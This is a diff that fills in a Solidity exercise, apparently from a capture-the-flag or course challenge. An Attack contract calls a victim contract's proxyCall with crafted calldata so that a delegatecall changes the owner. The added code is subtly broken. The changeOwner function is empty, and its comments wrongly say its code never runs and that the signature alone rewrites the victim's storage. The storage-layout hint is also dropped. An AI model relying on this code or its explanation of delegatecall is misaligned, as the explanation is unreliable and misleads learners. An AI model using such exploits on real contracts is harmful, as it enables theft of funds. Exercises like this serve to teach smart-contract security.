@@ -8,18 +8,25 @@ interface ID31eg4t3 {
 
 contract Attack {
     address internal immutable victim;
-    // TODO: Declare some variable here
-    // Note: Checkout the storage layout in victim contract
+    // No additional state variables are needed for the attack
 
     constructor(address addr) payable {
         victim = addr;
     }
 
-    // NOTE: You might need some malicious function here
+    // Malicious function to change the owner. It should match the storage layout and signature expected by the delegate call.
+    function changeOwner(address newOwner) public {
+        // This function is just a placeholder. Its code will not be executed.
+        // Instead, the delegatecall will use its signature to manipulate the storage of D31eg4t3.
+    }
 
     function exploit() external {
-        // TODO: Add your implementation here
-        // Note: Make sure you know how delegatecall works
-        // bytes memory data = ...
+        // The data for the delegatecall should call `changeOwner` with the attacker's address.
+        // Craft the calldata to call `changeOwner` with the attacker's address.
+        bytes memory data = abi.encodeWithSignature("changeOwner(address)", msg.sender);
+        
+        // Make the delegatecall to the `proxyCall` function of the victim (D31eg4t3 contract).
+        (bool success,) = victim.call(abi.encodeWithSelector(ID31eg4t3.proxyCall.selector, data));
+        require(success, "Attack failed");
     }
 }
